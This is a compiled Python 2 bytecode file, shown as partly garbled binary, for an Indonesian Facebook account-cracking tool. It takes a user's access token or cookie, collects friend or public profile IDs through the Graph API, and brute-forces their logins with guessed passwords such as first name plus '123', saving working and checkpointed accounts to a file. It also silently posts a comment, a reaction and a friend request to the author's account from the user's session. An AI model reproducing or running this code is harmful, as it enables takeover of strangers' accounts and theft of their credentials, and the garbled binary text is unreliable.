ó
Ù­$`c           @   s  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l Z d  d l m Z d Z d Z d Z d Z d Z d Z d	 Z e e e e e e e g Z e j e  Z e j e  Z y d  d l Z Wn e k
 rKe  j d
  n Xy d  d l Z Wn+ e k
 re  j d  e  j d  n Xd  d l m Z d  d l m  Z  d  d l m Z e! e  e j" d  e j    Z# e# j$ e%  e# j& e j' j(   d d d/ g e# _) e  j d  e% Z* d   Z+ e	 j, d e+  Z- e- j.   e	 j, d e+  Z- e- j.   e j/ d  e0 Z* d   Z1 d   Z2 d   Z3 d   Z4 d   Z5 d Z6 d Z7 d Z8 g  Z9 g  Z: g  a; g  a< g  Z= g  Z> g  Z? g  Z@ g  ZA g  ZB d    ZC d!   ZD d"   ZE d#   ZF d$   ZG d%   ZH d&   ZI d'   ZJ d(   ZK d)   ZL d*   ZM d+   ZN d,   ZO d-   ZP eQ d. k reK   eE   n  d S(0   iÿÿÿÿN(   t
   ThreadPools   [1;97ms   [1;91ms   [1;92ms   [1;93ms   [1;94ms   [1;95ms   [1;96ms   pip2 install mechanizes   pip2 install requestss   python2 Old.py(   t   ConnectionError(   t   Browser(   t   datetimet   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16t   clearc          C   sb   x[ t  j d d d d g  D]> }  t r, Pn  t j j d |   t j j   t j d  q Wd  S(   Ns   [1;96m|s   [1;92m/s   [1;95m-s   [1;91m\s	   loading g{®Gáz?(	   t	   itertoolst   cyclet   donet   syst   stdoutt   writet   flusht   timet   sleep(   t   c(    (    s   /sdcard/OLDD.pyt   animate'   s    "t   targeti    c           C   s   d GHt  j j   d  S(   Ns   [1;97m{[1;91m![1;97m} metu(   t   osR
   t   exit(    (    (    s   /sdcard/OLDD.pyt   keluar7   s    c         C   sS   d } d } x: |  D]2 } | d | t  j d t |  d  | 7} q Wt |  S(   Nt   mhkbpcPt    t   !i    i   (   t   randomt   randintt   lent   cetak(   t   xt   wt   dt   i(    (    s   /sdcard/OLDD.pyt   acak<   s
    0c         C   s~   d } xA | D]9 } | j  |  } |  j d | d t d |   }  q W|  d 7}  |  j d d  }  t j j |  d  d  S(   NR   s   !%ss   %s;i   R   s   !0s   
(   t   indext   replacet   strR
   R   R   (   R   R   R    t   j(    (    s   /sdcard/OLDD.pyR   E   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g{®Gáz?(   R
   R   R   R   R   R   (   t   zt   e(    (    s   /sdcard/OLDD.pyt   jalanP   s    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g{®Gázt?(   R
   R   R   R   R   R   (   R&   R'   (    (    s   /sdcard/OLDD.pyt   jalanxW   s    sð   [1;96mðððððððð SUBSCRIBE BANG BADRU ðððððððð
[1;96m ðððððððð SUBSCRIBE BANG BADRU ðððððððð
[1;34mââââââââââââââââââââââ[1;96mâââââââââââââââââââââââ
[1;34mâ  [1;93mAuthor   [1;91m: [1;92mMuhamad Badru [1;95mWasih                 [1;96mâ
[1;34mâ  [1;93mGithub   [1;91m: [1;92mhttps://[1;95mgithub.com/Dru-230    [1;96mâ
[1;34mâ  [1;93mYT       [1;91m: [1;92mBANG [1;95mBADRU [1;96mâ
[1;34mââââââââââââââââââââââ[1;96mâââââââââââââââââââââââs   
[1;34mPilih Salah Satu BosQ
c           C   s4   t  j d  t GHt j d  d GHd GHt   d  S(   NR   g©?s   [1;92m01.[1;97m Masuks   [1;91m00.[1;97m Keluar(   R   t   systemt   logobR   R   t
   pilih_boso(    (    (    s   /sdcard/OLDD.pyt   plebul   s    c          C   s{   t  d  }  |  d k r' d GHt   nP |  d k s? |  d k rI t   n. |  d k sa |  d k rk t   n d GHt   d  S(   Ns   [1;92mâ£ [91m:[1;92m R   s'   [1;97m[[1;91m![1;97m] Isi YG Bener !t   1t   01t   0t   00(   t	   raw_inputR,   t   masukR   (   t   sok(    (    s   /sdcard/OLDD.pyR,   u   s    


c           C   s   t  j d  t t  t j d  d GHt j d  d GHt j d  d GHt j d  d GHt j d  d GHt j d  d GHt j d  t   d  S(   NR   g©?s4   [1;94m=============================================s!   [1;92m01.[1;97m Login Via Tokens#   [1;92m02.[1;97m Login Via Cookiess&   [1;92m03.[1;97m Totorial Login Tokens   [1;91m00.[1;97m Exit(   R   R*   R)   t   logoR   R   t   pilih_masuk(    (    (    s   /sdcard/OLDD.pyR3      s     
c          C   s¿   t  d  }  |  d k r' d GHt   n |  d k s? |  d k rI t   nr |  d k sa |  d k rk t   nP |  d k s |  d	 k r t   n. |  d
 k s¥ |  d k r¯ t   n d GHt   d  S(   Ns   [1;92mâ£ [91m:[1;92m R   s'   [1;97m[[1;91m![1;97m] Isi Yg Bener !R.   R/   t   2t   02t   3t   03R0   R1   s'   [1;97m[[1;91m![1;97m] Isi YG Bener !(   R2   R6   t   tokenzt   cookiet   ambil_tokenR   (   t   msuk(    (    s   /sdcard/OLDD.pyR6      s    




c          C   sÐ   t  j d  t GHd GHt d  }  yw t j d |   } t j | j  } t	 d d  } | j
 |   | j   d GHt d  t  j d	  d GHt   Wn/ t k
 rË d
 GHd GHt j d  t   n Xd  S(   NR   s4   [1;94m=============================================s/   [1;97m{[1;95m?[1;97m} Token [1;91m:[1;92m s+   https://graph.facebook.com/me?access_token=s	   login.txtR   s3   [1;97m{[1;92mâ[1;97m}[1;93m Login Berhasil ! s   [1;97mJangan Lupa Subscribe:)s2   xdg-open https://youtube.com/c/MuhamadBadruOFFCIALs-   [1;97m{[1;91m![1;97m} [1;91mToken salah !g{®Gáz?(   R   R*   R5   R2   t   requestst   gett   jsont   loadst   textt   openR   t   closeR(   t   menut   KeyErrorR   R   R-   (   t   tokett   otwt   at   zedd(    (    s   /sdcard/OLDD.pyR;   ¨   s(    

c          C   s2  t  j d  t GHd GHt d  }  y t j d d i	 d d 6d d	 6d
 d 6d d 6d d 6d d 6d d 6d d 6d d 6d i |  d 6} t j d | j  } | d  k r® d n d | j
 d  } Wn t j j k
 rà d GHn Xt d d   }  |  j | j
 d   |  j   d! GHd GHt j d"  t   d  S(#   NR   s4   [1;94m=============================================s0   [1;97m{[1;95m?[1;97m} Cookie [1;91m:[1;92m sG   https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_t   headerss   Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36s
   user-agents   https://m.facebook.com/t   referers   m.facebook.comt   hosts   https://m.facebook.comt   originR.   s   upgrade-insecure-requestss#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages	   max-age=0s   cache-controlsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8t   accepts   text/html; charset=utf-8s   content-typet   cookiess    Cookie s	   (EAAA\w+)s&   
* Fail : maybe your cookie invalid !!s   
* Your fb access token : i   s)   [1;97m[[1;91m![1;97m] Tidak Ada Sinyals	   login.txtR   s/   [1;97m([1;92mâ[1;97m)[1;92m Sukses Bro ! i   (   R   R*   R5   R2   R?   R@   t   ret   searchRC   t   Nonet   groupt
   exceptionsR   RD   R   RE   R   R   RF   (   R<   t   datat
   find_tokent   hasil(    (    s   /sdcard/OLDD.pyR<   ¿   s4    )	
c           C   sK   t  j d  t GHd GHt d  d GHt  j d  t j d  t   d  S(   NR   s4   [1;94m=============================================s/           [1;92mAnda Akan Diarahkan Ke Yutub ...s-   xdg-https://youtube.com/c/MuhamadBadruOFFCIALg{®Gáz?(   R   R*   R5   R(   R   R   R3   (    (    (    s   /sdcard/OLDD.pyR=   Ý   s    
c          C   sÏ   y t  d d  j   }  Wn# t k
 r> d GHt j d  n Xd } d } d } d } d	 } d	 } d	 } t j d
 | d |   t j d | d | d |   t j d | d | d |   t   d  S(   Ns	   login.txtt   rs   [1;97m[!] Token Wasteds   rm -rf login.txtt   100006230836266s   MANTAP BANG SCRIPT Nyaâºï¸t   angryt   2880834122134254R   s7   https://graph.facebook.com/me/friends?method=post&uids=s   &access_token=s   https://graph.facebook.com/s   /comments/?message=s   /reactions?type=(   RD   t   readt   IOErrorR   R*   R?   t   postRF   (   RH   t   unat   komt   reacR`   t   post2t   kom2t   reac2(    (    s   /sdcard/OLDD.pyt	   bot_komenè   s     !!c          C   sÍ  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t  j d  t   n Xy= t j d |   } t j	 | j
  } | d } | d } Wnz t k
 r÷ t  j d  d	 GHt  j d  t j d
  t   t j d
  t   n# t j j k
 rd GHt   n Xt  j d  t t  d GHd | GHd | GHd | d GHt j d  d GHt j d  d t d t d GHt j d  d t d GHt j d  d GHt j d  t   d  S(   NR   s	   login.txtRZ   s   {!} Token Wasted !s   rm -rf login.txts,   https://graph.facebook.com/me/?access_token=t   namet   ids   [1;96m[!] [1;91mToken Wastedi   s   {!} Tidak Ada Sinyals4   [1;94m=============================================s=   [1;97m{[1;96mâ¢[1;97m}[1;95m Nama[1;90m      =>[1;92m s>   [1;97m{[1;96mâ¢[1;97m}[1;95m My ID[1;90m      =>[1;92m sB   [1;97m{[1;96mâ¢[1;97m}[1;95m Tanggal Lahir[1;90m =>[1;92m  t   birthdayg©?s   [1;97m{s
   01[1;97m}s    Crack Id Dari Teman/Publiks   [1;97m{[1;91m00[1;97m}s    Exit(   R   R*   RD   R^   R_   R-   R?   R@   RA   RB   RC   RG   R   R   RV   R   R   R)   R5   t   warnit   warnat   pilih(   RH   RI   RJ   t   namaRi   (    (    s   /sdcard/OLDD.pyRF   ü   sP    


		c          C   s   t  d  }  |  d k r' d GHt   nt |  d k s? |  d k rI t   nR |  d k sa |  d k r t j d  t d	  t j d
  t   n d GHt   d  S(   Ns   [1;92mâ£ [91m:[1;92m R   s.   [1;97m{[1;91m![1;97m}[1;97m Isi Yg Bener !R.   R/   R0   R1   R   s   Mbusek tokens   rm -rf login.txt(   R2   Rm   t   crack_temanR   R*   R(   R   (   t   unikers(    (    s   /sdcard/OLDD.pyRm   )  s    



c           C   s   t  j d  t GHt j d  d GHt j d  d t d t d GHt j d  d t d GHt j d  d GHt j d  t   d  S(	   NR   g©?s4   [1;94m=============================================s   [1;97m{s
   01[1;97m}s    Crack ID Indonesias   [1;97m{[1;91m00[1;97m}s    kemKembali(   R   R*   R5   R   R   Rl   Rk   t   pilih_teman(    (    (    s   /sdcard/OLDD.pyRo   :  s    c          C   s{   t  d  }  |  d k r' d GHt   nP |  d k s? |  d k rI t   n. |  d k sa |  d k rk t   n d GHt   d  S(   Ns   [1;92mâ£ [91m:[1;92m R   s.   [1;97m{[1;91m![1;97m}[1;97m Isi Yg Bener !R.   R/   R0   R1   (   R2   Rq   t
   crack_indoRF   (   t   univ(    (    s   /sdcard/OLDD.pyRq   I  s    


c           C   sö   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHt j d  d GHt j d  d	 GHt j d  d
 GHt j d  d GHt j d  d GHt j d  d GHt j d  t
   d  S(   NR   s	   login.txtRZ   s   [1;96m[!] [1;91mToken Wasteds   rm -rf login.txti   g©?s4   [1;94m=============================================s1   [1;97m{[1;93m01[1;97m} Crack Dark Daftar Temans1   [1;97m{[1;93m02[1;97m} Crack Dari Publik/Temans)   [1;97m{[1;93m03[1;97m} Crack Dari Files!   [1;97m{[1;91m00[1;97m} Kembalk(   R   R*   RD   R^   RH   R_   R   R   R   R5   t
   pilih_indo(    (    (    s   /sdcard/OLDD.pyRr   W  s0    c          C   s¬  t  d  }  |  d k r' d GHt   nþ|  d k s? |  d k r® t j d  t GHd GHd GHd GHt j d	 t  } t j	 | j
  } xA| d
 D] } t j | d  q Wn|  d k sÆ |  d k rÓt j d  t GHd GHd GHd GHt  d  } y> t j d | d t  } t j	 | j
  } d | d GHWnI t k
 rZd GHt  d  t   n# t j j k
 r|d GHt   n Xt j d | d t  } t j	 | j
  } x| d
 D] } t j | d  qµWnö |  d k së|  d k rt j d  t GHyR d GHd GHd GHt  d  } x0 t | d  j   D] }	 t j |	 j    q1WWqÉt k
 rqd GHt  d  qÉt k
 rd GHt  d  t   qÉXn. |  d  k s³|  d! k r½t   n d" GHt   d# t t t   GHd$ GHd% d& d' g }
 x0 |
 D]( } d( | Gt j j   t j d)  qùWd* GHd GHd+   } t d,  } | j | t  d GHd- GHd. t t t    d/ t t t!   GHd0 GHd GHt  d1  t j d2  d  S(3   Ns   [1;92mâ£ [91m:[1;92m R   s0   [1;97m{[1;91m![1;97m}[1;97m Isi Seng Bener !R.   R/   R   s4   [1;94m=============================================s9                [1;97m>>> [1;92mCRACK INDONESIA [1;97m<<<s3   https://graph.facebook.com/me/friends?access_token=RW   Ri   R7   R8   s6             [1;97m>>> [1;92mCRACK INDONESIA [1;97m<<<sA   [1;97m[[1;93m>>[1;97m] [1;93mID Publik/Teman [1;91m:[1;96m s   https://graph.facebook.com/s   ?access_token=s7   [1;97m[[1;93m>>[1;97m][1;93m Teman [1;91m:[1;96m Rh   s*   [1;97m{[1;91m![1;97m} ID publik/Teman !s!   
[1;93m{[1;97m>Kembali<[1;93m}s+   [1;97m{[1;91m![1;97m} Tidak Ada Sinyal !s   /friends?access_token=R9   R:   s;   [1;97m{[1;93m<>[1;97m} [1;93mNama File[1;91m :[1;92m RZ   s(   [1;97m{[1;91m![1;97m} File Ora Ono ! s!   
[1;92m[ [1;97mKembali [1;92m]s'   [1;97m{[1;91m![1;97m} File Ora Ono !s!   
[1;93m{[1;97m<Kembali>[1;93m}R0   R1   s.   [1;97m[[1;91m![1;97m][1;97m Isi Yg Bener !s:   [1;97m{[1;93m<>[1;97m} [1;93mTotal ID [1;91m:[1;92m s,   [1;97m{[1;93m<>[1;97m} [1;93mStop CTRL+Zs   .   s   ..  s   ... s1   [1;97m{[1;93m<>[1;97m} [1;93mCrack Berjalan i   sN   
[1;97m[1;93m[1;97m[1;93mGunakan Mode Pesawat 5Detik Bila Tidak Ada Hasil!c         S   s~  |  } y t  j d  Wn t k
 r* n XyEt j d | d t  } t j | j  } d } t	 j
 d | d | d  } t j |  } d | k rò d	 | d
 | GHt d d  } | j d | d
 | d  | j   t j |  n}d | d k rYd | d
 | GHt d d  } | j d | d
 | d  | j   t j |  n| d j   d }	 t	 j
 d | d |	 d  } t j |  } d | k rþd	 | d
 | GHt d d  } | j d | d
 | d  | j   t j |  nqd | d k red | d
 | GHt d d  } | j d | d
 | d  | j   t j |  n
| d j   d }
 t	 j
 d | d |
 d  } t j |  } d | k r
d	 | d
 |
 GHt d d  } | j d | d
 |
 d  | j   t j |  n d | d k rqd | d
 |
 GHt d d  } | j d | d
 |
 d  | j   t j |  n% d } t	 j
 d | d | d  } t j |  } d | k rd	 | d
 | GHt d d  } | j d | d
 | d  | j   t j |  ng d | d k rod | d
 | GHt d d  } | j d | d
 | d  | j   t j |  n  Wn n Xd  S(   NR	   s   https://graph.facebook.com/s   /?access_token=t   sayangs   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens   [0;92m[OK] s    > s   done/indo.txtRJ   s   
[OK] R   s   www.facebook.comt	   error_msgs   [0;93m[CP] s   
[CP] t
   first_namet   1234t   123t   anjing(   R   t   mkdirt   OSErrorR?   R@   RH   RA   RB   RC   t   urllibt   urlopent   loadRD   R   RE   t   okst   appendt   cekpointt   lower(   t   argt   zowet   anR%   t   bos1RW   t   kot   oket   cekt   bos2t   bos3t   bos4(    (    s   /sdcard/OLDD.pyt   mainÂ  s    







i   s0   [1;97m[[1;93m<>[1;97m] [1;93mDone BosQuu ...sR   [1;97m[[1;93m<>[1;97m] [1;93mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;93msh   [1;97m[[1;93m<>[1;97m] [1;92mOK[1;97m/[1;93mCP [1;93mfile Tersimpan [1;91m: [1;92mdone/indo.txts#   [1;97m[>[1;93mKemKembali[1;97m<]s   python2 Old.py("   R2   Rt   R   R*   R5   R?   R@   RH   RA   RB   RC   Ri   R   RG   Rr   RV   R   R   RD   t	   readlinest   stripR_   RF   R$   R   R
   R   R   R   R   R    t   mapR   R   (   t   teakRZ   R&   t   st   idtt   pokt   spR    t   idlistt   linet   titikt   oR   t   p(    (    s   /sdcard/OLDD.pyRt   t  s    




	L)
t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(R   R   R
   R   t	   mechanizeR   R   R   t   hashlibRR   t	   threadingRA   t   getpassR~   t	   cookielibt   multiprocessing.poolR    t   Pt   Mt   Ht   Kt   Bt   Ut   Ot   my_colort   choiceRl   Rk   t   ImportErrorR*   R?   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingt   brt   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR	   R   t   Threadt   tt   startR   t   TrueR   R!   R   R(   R)   R5   R+   t   backt   threadst   berhasilR   R   R   Ri   t   usernamet   idtemant   idfromtemant   bosoR-   R,   R3   R6   R;   R<   R=   Rg   RF   Rm   Ro   Rq   Rr   Rt   t   __name__(    (    (    s   /sdcard/OLDD.pyt   <module>   s   ¨
		

																-					¥